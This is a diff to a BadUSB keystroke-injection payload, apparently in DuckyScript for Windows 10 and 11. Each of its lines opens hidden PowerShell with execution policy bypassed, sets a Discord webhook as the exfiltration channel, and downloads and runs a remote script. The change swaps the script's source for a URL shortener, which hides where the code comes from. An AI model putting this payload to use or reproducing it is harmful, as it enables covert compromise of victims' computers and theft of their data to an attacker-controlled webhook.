@@ -7,7 +7,7 @@ REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING powershell -w h -ep bypass $dc='https://discord.com/api/webhooks/1285948393914634354/099Jj8SDd4X_LxsKkxuLwT-ah8Lu_86-Tzy8S8aF3ZqIAzzZcjxo6VebeDlkkiJ25LFD';$db='';irm https://jakoby.lol/hgw | iex
+STRING powershell -w h -ep bypass $dc='https://discord.com/api/webhooks/1285948393914634354/099Jj8SDd4X_LxsKkxuLwT-ah8Lu_86-Tzy8S8aF3ZqIAzzZcjxo6VebeDlkkiJ25LFD';$db='';irm https://tinyurl.com/yc83587a | iex
 ENTER
 
 REM     Fill in either variable or both to set your exfil method.
